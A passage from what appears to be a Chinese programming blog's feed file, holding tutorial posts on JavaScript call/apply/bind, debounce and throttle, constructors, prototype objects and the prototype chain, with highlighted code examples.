方法<strong>调用函数</strong>，同时指定函数中 <code>this</code> 的值</p><p><strong>语法</strong>：<code>fn.apply(thisArg, [argsArray])</code></p><ul><li><code>thisArg</code>：在fn函数运行时指定的 <code>this</code> 值</li><li><code>argsArray</code>：传递的值，必须包含在数组里面</li><li>返回值就是函数的返回值，因为它就是调用函数</li><li>因此 <code>apply()</code> 主要跟数组有关系，比如使用 <code>Math.max()</code> 求数组的最大值</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sayHi</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line">sayHi.<span class="title function_">apply</span>(user); <span class="comment">// this 值为 user</span></span><br><span class="line"><span class="comment">// 可以用作调用函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">counter</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用 counter 函数，并传入参数</span></span><br><span class="line"><span class="keyword">let</span> result = counter.<span class="title function_">apply</span>(<span class="literal">null</span>, [<span class="number">5</span>, <span class="number">10</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// 15</span></span><br><span class="line"><span class="comment">// 求最大值的用法</span></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="property">max</span>.<span class="title function_">apply</span>(<span class="literal">null</span>, arr)) <span class="comment">// 8</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">max</span>(...arr)) <span class="comment">// 8</span></span><br></pre></td></tr></table></figure><p>总结：</p><ol><li><code>apply()</code> 方法与<code>call()</code> 方法几乎一致，只是第二个参数是否为数组的区别</li></ol><h3 id="bind"><a href="#bind" class="headerlink" title="bind()"></a>bind()</h3><p><code>bind</code> 方法并<strong>不会调用函数</strong>，而是创建一个指定了 <code>this</code> 值的新函数</p><p><strong>语法</strong>：<code>fn.bind(thisArg, arg1, arg2, ...)</code></p><ul><li><code>thisArg</code>：在 fn 函数运行时指定的 <code>this</code> 值</li><li><code>arg1</code>，<code>arg2</code>：传递的其他参数</li><li>返回由指定的 <code>this</code> 值和初始化参数改造的原函数拷贝（新函数）</li><li>因此当我们只是想改变 <code>this</code> 指向，并且不想调用这个函数的时候，可以使用 <code>bind()</code>，比如改变定时器内部的<code>this</code>指向</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">saythis</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;ikun&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> saythat = saythis.<span class="title function_">bind</span>(user) <span class="comment">// 不会调用原函数，而是返回原函数的拷贝</span></span><br><span class="line"><span class="title function_">saythat</span>()</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240312150111.png" alt="image.png"></p><h3 id="三种方法的区别"><a href="#三种方法的区别" class="headerlink" title="三种方法的区别"></a>三种方法的区别</h3><p><strong>相同点</strong>：</p><ul><li>都可以改变函数内部的<code>this</code>指向</li></ul><p><strong>区别点</strong>：</p><ul><li><code>call</code> 和 <code>apply</code> 会调用函数, 并且改变函数内部<code>this</code>指向</li><li><code>call</code> 和 <code>apply</code> 传递的参数不一样，<code>call</code> 传递参数 <code>arg1</code>, <code>arg2..</code>形式，而<code>apply</code> 必须数组形式<code>[arg]</code></li><li><code>bind</code> 不会调用函数，可以改变函数内部<code>this</code>指向</li></ul><p><strong>主要应用场景</strong>：</p><ul><li><code>call</code> 调用函数并且可以传递参数</li><li><code>apply</code> 经常跟数组有关系，比如借助于数学对象实现数组最大值最小值</li><li><code>bind</code>不调用函数，但是还想改变<code>this</code>指向，比如改变定时器内部的<code>this</code>指向</li></ul><h1 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h1><h2 id="防抖"><a href="#防抖" class="headerlink" title="防抖"></a>防抖</h2><p><strong>防抖</strong>（debounce），就是指触发事件后在 n 秒内函数只能执行一次，如果在 n 秒内又触发了事件，则会重新计算函数执行时间</p><p>例如之前的<a href="https://m78alien.github.io/2024/03/05/JavaScript-%E6%A1%88%E4%BE%8B%E5%BA%94%E7%94%A8-%E5%95%86%E5%93%81%E6%94%BE%E5%A4%A7%E9%95%9C/">商品放大镜案例</a>，鼠标放入盒子就会在旁边出现放大效果，离开200ms后消失，但是如果在200ms之内鼠标再次返回盒子，则不会出现放大效果，所以需要设定重新计算执行时间</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//监听鼠标经过和离开</span></span><br><span class="line">middle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, show)</span><br><span class="line">middle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, hide)</span><br><span class="line">large.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, show)</span><br><span class="line">large.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, hide)</span><br><span class="line"><span class="comment">//timeId用于清除计时器</span></span><br><span class="line"><span class="keyword">let</span> timeId = <span class="literal">null</span></span><br><span class="line"><span class="comment">//显示函数，在鼠标经过中盒子和大盒子都显示，通过修改display的值，显示时清除计时器</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="built_in">clearTimeout</span>(timeId)</span><br><span class="line">large.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//隐藏函数，当鼠标离开中盒子和大盒子都隐藏，并设有计时器</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hide</span>(<span class="params"></span>) &#123;</span><br><span class="line">timeId = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">large.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line">&#125;, <span class="number">200</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="节流"><a href="#节流" class="headerlink" title="节流"></a>节流</h2><p><strong>节流</strong>（throttle），就是指连续触发事件但是在 n 秒中只执行一次函数</p><p>假如一张轮播图完成切换需要300ms， 不加节流效果，快速点击，则嗖嗖嗖的切换，加上节流效果，不管快速点击多少次，300ms时间内，只能切换一张图片。</p>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-深入面向对象</title>
      <link href="/2024/03/11/JavaScript-%E6%B7%B1%E5%85%A5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
      <url>/2024/03/11/JavaScript-%E6%B7%B1%E5%85%A5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h1><p>在面向对象程序开发思想中，每一个对象都是功能中心，具有明确分工。</p><p>面向对象编程具有灵活、代码可复用、容易维护和开发的优点，更适合多人合作的大型软件项目。</p><p><strong>面向对象的特性</strong>：</p><ul><li>封装性</li><li>继承性</li><li>多态性</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240311144039.png" alt="image.png"></p><h1 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h1><p>封装是面向对象思想中比较重要的一部分，js面向对象可以通过构造函数实现的封装。</p><p>同样的将变量和函数组合到了一起并能通过 <code>this</code> 实现数据的共享，所不同的是借助构造函数创建出来的实例对象之间是<strong>彼此不影响</strong>的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;无名氏&#x27;</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">age</span> = <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">set</span> = <span class="keyword">function</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">get</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>今年<span class="subst">$&#123;<span class="variable language_">this</span>.age&#125;</span>岁了`</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建实例</span></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line">p1.<span class="title function_">set</span>(<span class="string">&#x27;kenan&#x27;</span>, <span class="number">12</span>)</span><br><span class="line">p1.<span class="title function_">get</span>() <span class="comment">// kenan今年12岁了</span></span><br><span class="line">p2.<span class="title function_">get</span>() <span class="comment">// 无名氏今年0岁了</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">set</span> === p2.<span class="property">set</span>) <span class="comment">// false，表示两个函数不一样</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：构造函数存在一个问题，同一个对象，不同实例的函数，在堆当中会重复存储，造成内存浪费的问题</p><h1 id="原型对象"><a href="#原型对象" class="headerlink" title="原型对象"></a>原型对象</h1><p>构造函数通过原型分配的函数是所有对象所<strong>共享</strong>的。</p><ul><li>JavaScript 规定，每一个构造函数都有一个 <code>prototype</code> 属性，指向另一个对象，所以我们也称为<strong>原型对象</strong></li><li>这个对象可以挂载函数，对象实例化不会多次创建原型上函数，节约内存</li><li>我们可以把那些不变的方法，直接定义在 prototype 对象上，这样所有对象的实例就可以共享这些方法。</li><li>构造函数和原型对象中的<code>this</code>都指向实例化的对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 每个函数都有 prototype 属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>) <span class="comment">// 返回一个对象称为原型对象</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sing</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;唱歌&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">sing</span> === p2.<span class="property">sing</span>) <span class="comment">// true，说明两个函数一样，共享</span></span><br></pre></td></tr></table></figure><p>构造函数 <code>Person</code> 中定义与原型对象中相同名称的方法，这时实例对象调用则是构造函中的方法 <code>sayHi</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// 此处定义同名方法 sayHi</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">sayHi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;嗨!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 为构造函数的原型对象添加方法</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hi~&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">p1.<span class="title function_">sayHi</span>(); <span class="comment">// 输出结果为 嗨!</span></span><br></pre></td></tr></table></figure><p>通过以上两个简单示例不难发现 JavaScript 中对象的工作机制：<strong>当访问对象的属性或方法时，先在当前实例对象是查找，然后再去原型对象查找，并且原型对象被所有实例共享。</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// 此处定义同名方法 sayHi</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">sayHi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;嗨!&#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 为构造函数的原型对象添加方法</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hi~&#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在构造函数的原型对象上添加属性</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">name</span> = <span class="string">&#x27;小明&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line">p1.<span class="title function_">sayHi</span>(); <span class="comment">// 输出结果为 嗨!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line">p2.<span class="title function_">sayHi</span>()</span><br></pre></td></tr></table></figure><p>总结：<strong>结合构造函数原型的特征，实际开发重往往会将封装的功能函数添加到原型对象中。</strong></p><h2 id="constructor属性"><a href="#constructor属性" class="headerlink" title="constructor属性"></a>constructor属性</h2><p>每个原型对象里面都有个<code>constructor</code>属性（constructor 构造函数）</p><p><strong>作用</strong>：该属性指向该原型对象的构造函数， 简单理解，就是指向我的爸爸，我是有爸爸的孩子</p><p><strong>使用场景：</strong></p><ol><li>如果有多个对象的方法，我们可以给原型对象采取对象形式赋值.</li><li>但是这样就会覆盖构造函数原型对象原来的内容，这样修改后的原型对象 constructor 就不再指向当前构造函数了</li><li>此时，我们可以在修改后的原型对象中，添加一个 constructor 指向原来的构造函数。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Star</span>(<span class="params"></span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Star</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="title class_">Star</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line"><span class="comment">// constructor: Star,  // 重新指向Star构造函数</span></span><br><span class="line"><span class="attr">sing</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;唱歌&#x27;</span>)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">dance</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;跳舞&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Star</span>.<span class="property"><span class="keyword">prototype</span></span>) <span class="comment">// constructor属性被覆盖了，需要主动添加</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240311155550.png" alt="image.png"></p><h2 id="对象原型"><a href="#对象原型" class="headerlink" title="对象原型"></a>对象原型</h2><p>对象都会有一个属性<code>__proto__</code>指向构造函数的 prototype 原型对象，之所以我们对象可以使用构造函数 prototype原型对象的属性和方法，就是因为对象有<code>__proto__</code>原型的存在。</p><p>注意：</p><ul><li><code>__proto__</code>是JS非标准属性</li><li><code>prototype</code>和<code>__proto__</code>意义相同</li><li>用来表明当前实例对象指向哪个原型对象<code>prototype</code></li><li><code>__proto__</code>对象原型里面也有一个 <code>constructor</code>属性，指向创建该实例对象的构造函数</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240311160155.png" alt="image.png"></p><h2 id="原型继承"><a href="#原型继承" class="headerlink" title="原型继承"></a>原型继承</h2><p>继承是面向对象编程的另一个特征，通过继承进一步提升代码封装的程度，JavaScript 中大多是借助原型对象实现继承的特性。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">eyes</span> = <span class="number">2</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">head</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建女人构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Women</span>(<span class="params"></span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Women</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Person</span>() <span class="comment">// 继承Person</span></span><br><span class="line"><span class="title class_">Women</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Women</span> <span class="comment">// 指向回Women</span></span><br><span class="line"><span class="title class_">Women</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">baby</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;生小孩&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建男人构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Man</span>(<span class="params"></span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Man</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line"><span class="title class_">Man</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Man</span></span><br><span class="line"><span class="title class_">Man</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">smoke</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;吸烟&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 实例化</span></span><br><span class="line"><span class="keyword">const</span> li = <span class="keyword">new</span> <span class="title class_">Women</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(li)</span><br><span class="line"><span class="keyword">const</span> wang = <span class="keyword">new</span> <span class="title class_">Man</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(wang)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240311163356.png" alt="image.png"></p><p>这样是现实不同的构造函数继承相同的函数</p><h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>基于原型对象的继承使得不同构造函数的原型对象关联在一起，并且这种关联的关系是一种链状的结构，我们将原型对象的链状结构关系称为<strong>原型链</strong></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240311163735.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1 <span class="keyword">instanceof</span> <span class="title class_">Person</span>) <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1 <span class="keyword">instanceof</span> <span class="title class_">Object</span>) <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1 <span class="keyword">instanceof</span> <span class="title class_">Array</span>) <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] <span class="keyword">instanceof</span> <span class="title class_">Array</span>) <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Array</span> <span class="keyword">instanceof</span> <span class="title class_">Object</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><ol><li>当访问一个对象的属性（包括方法）时，首先查找这个对象自身有没有该属性。</li><li>如果没有就查找它的原型（也就是<code> __proto__</code>指向的 <code>prototype</code> 原型对象）</li><li>如果还没有就查找原型对象的原型（<code>Object</code>的原型对象）</li><li>依此类推一直找到 <code>Object</code> 为止（<code>null</code>）</li><li><code>__proto__</code>对象原型的意义就在于为对象成员查找机制提供一个方向，或者说一条路线</li><li>可以使用 <code>instanceof</code> 运算符用于检测构造函数的 <code>prototype</code> 属性是否出现在某个实例对象的原型链上</li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-构造函数、数据常用函数</title>
      <link href="/2024/03/07/JavaScript-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E3%80%81%E6%95%B0%E6%8D%AE%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
      <url>/2024/03/07/JavaScript-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E3%80%81%E6%95%B0%E6%8D%AE%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="深入对象"><a href="#深入对象" class="headerlink" title="深入对象"></a>深入对象</h1><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>创建对象有三种方式</p><ol><li><strong>利用对象字面量创建对象</strong></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> o = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;柯南&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>利用new object创建对象</strong></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> o = <span class="keyword">new</span> <span class="title class_">Object</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;柯南&#x27;</span> &#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o) <span class="comment">// &#123;name: &#x27;柯南&#x27;&#125;</span></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>利用构造函数创建对象</strong></li></ol><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>构造函数是专门用于创建对象的函数，如果一个函数使用 <code>new</code> 关键字调用，那么这个函数就是<strong>构造函数</strong>。</p><ul><li><strong>构造函数：</strong> 时一种特殊的函数，主要用来初始化对象</li><li><strong>使用场景：</strong> 常规的{…}语法允许创建一个对象。比如我们创建了柯南的对象，继续创建小兰的对象还需要重新写一遍，此时可以通过<strong>构造函数</strong>来<strong>快速创建多个类似的对象</strong></li><li><strong>构造函数语法：</strong> 大写字母开头命名</li><li><strong>实例化执行过程：</strong> <ol><li>创建新对象</li><li>构造函数<code>this</code>指向新对象</li><li>执行构造函数代码，修改<code>this</code>，添加新的属性</li><li>返回新对象</li></ol></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 